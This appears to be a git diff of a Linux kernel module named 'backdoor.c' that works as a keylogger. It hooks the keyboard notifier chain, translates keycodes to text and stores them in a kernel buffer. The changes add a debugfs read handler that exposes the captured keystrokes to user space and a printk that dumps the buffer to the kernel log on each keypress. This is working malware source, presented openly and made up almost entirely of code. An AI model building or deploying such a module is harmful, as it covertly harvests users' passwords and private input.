@@ -1,12 +1,27 @@
+/**
+ * @file backdoor.c
+ * @author your name (you@domain.com)
+ * @brief 
+ * @ref https://0x00sec.org/t/linux-keylogger-and-notification-chains/4566
+ * https://docs.kernel.org/input/notifier.html
+ * @version 0.1
+ * @date 2023-06-24
+ * 
+ * @copyright Copyright (c) 2023
+ * 
+ */
+
 #include <linux/init.h>
 #include <linux/module.h>
+#include <linux/moduleparam.h>
 #include <linux/kernel.h>
 #include <linux/debugfs.h>
 #include <linux/stat.h>
 #include <linux/keyboard.h>
 #include <linux/input.h>
 
-#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
+#define CHUNK_LEN  12 /* Encoded 'keycode shift' chunk length */
+#define BUFFER_LEN (PAGE_SIZE << 2) 
 
 /*
  * Keymap references:
@@ -57,7 +72,12 @@ static const char *dictionary[][2] = {
 static struct dentry *file;
 static struct dentry *subdir;
 
+static size_t buf_pos;
+static char keys_buf[BUFFER_LEN];
+
 static int keypress_callback(struct notifier_block *notifier, unsigned long action, void *data);
+static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
+
 
 /**
  * @brief notifier_call is given by my function
@@ -73,9 +93,31 @@ static struct notifier_block alarm_block = {
  */
 const struct file_operations keys_fops = {
 	.owner = THIS_MODULE,
-	// . read = not created yet
+	.read = keys_read,
 };
 
+/**
+ * @brief copy data from the buffer to user space
+ * 
+ * @param filp file
+ * @param buffer the user user space to read to
+ * @param len maximum number of bytes in buffer
+ * @param offset current position in buffer
+ * @return ssize_t the status of the read
+ */
+static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset) {
+	// when offset is over, copy to file
+	return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
+}
+
+/**
+ * @brief convert keycode to string
+ * given the dictionary created, each keycode is dictionary's index
+ * acccess the dictionary in given index to find the correspond key
+ * @param keycode key pressed 
+ * @param shift_is_pressed if shift is pressed
+ * @param buffer storage the key translated
+ */
 void keycode_to_string(int keycode, int shift_is_pressed, char *buffer){
 	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
 		const char *key_translated = (shift_is_pressed == 1)
@@ -96,6 +138,7 @@ void keycode_to_string(int keycode, int shift_is_pressed, char *buffer){
  */
 int keypress_callback(struct notifier_block *notifier, unsigned long action, void *data){
 	char key_buffer[CHUNK_LEN] = {0}; // it will storage the translated keycode 
+	size_t len;
 	struct keyboard_notifier_param *param = data;
 
 	// EXIT IF KEY IS NOT PRESSED
@@ -105,9 +148,28 @@ int keypress_callback(struct notifier_block *notifier, unsigned long action, voi
 	// CONVERT KEYCODE TO READABLE
 	keycode_to_string(param->value, param->shift, key_buffer);
 
+	len = strlen(key_buffer);
+	if (len < 1) // unmapped
+		return NOTIFY_OK;
+
+	// OVERSIZED BUFFER => RESETS
+	if ((buf_pos + len) >= BUFFER_LEN)
+		buf_pos = 0;
+	printk(KERN_INFO "keys_buffer = %s\n", keys_buf);
+
+	// STRING KEY TO BUFFER
+	strncpy(keys_buf + buf_pos, key_buffer, len);
+	buf_pos += len;
+
 	return NOTIFY_OK;
 }
 
+/**
+ * @brief module entry point
+ *  creates debufs directory and file to log keys
+ * register notified structure @notifier_block
+ * @return 0 on successful, ohterwise return a message error
+ */
 static int __init backdoor_init(void){    
     printk(KERN_INFO "[+] Backdoor Initialized\n");
 
